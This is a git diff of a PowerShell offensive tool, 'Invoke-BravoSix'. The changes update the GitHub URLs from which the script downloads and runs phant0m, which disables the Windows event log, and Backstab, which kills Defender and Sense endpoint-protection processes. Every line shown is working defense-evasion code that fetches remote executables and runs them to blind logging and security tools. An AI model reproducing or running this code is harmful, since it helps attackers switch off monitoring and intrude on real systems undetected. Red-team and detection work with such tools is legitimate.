@@ -11,7 +11,7 @@ function Invoke-BravoSix {
     # phanth0m disable event log
     Write-Host "[i] Disabling Event Log"
     Write-Host "[i] Downloading phanth0m"
-    Invoke-WebRequest -Uri https://github.com/RFC1918-hub/RFCRandom/raw/main/phant0m-exe.exe -OutFile $downloadDirectory\phant0m-exe.exe
+    Invoke-WebRequest -Uri https://github.com/RFC1918-hub/Invoke-BravoSix/raw/main/phant0m-exe.exe -OutFile $downloadDirectory\phant0m-exe.exe
     Write-Host "[i] Running phanth0m"
     & $downloadDirectory\phant0m-exe.exe
 
@@ -37,7 +37,7 @@ function Invoke-BravoSix {
 
     # backstab to kill defender processes
     Write-Host "[i] Downloading backstab"
-    Invoke-WebRequest https://github.com/RFC1918-hub/RFCRandom/raw/main/Backstab.exe -OutFile $downloadDirectory\Backstab.exe
+    Invoke-WebRequest https://github.com/RFC1918-hub/Invoke-BravoSix/raw/main/Backstab.exe -OutFile $downloadDirectory\Backstab.exe
     Write-Host "[i] Running backstab"
     # killing all sense processes
     Write-Host "[i] Killing all Sense processes"
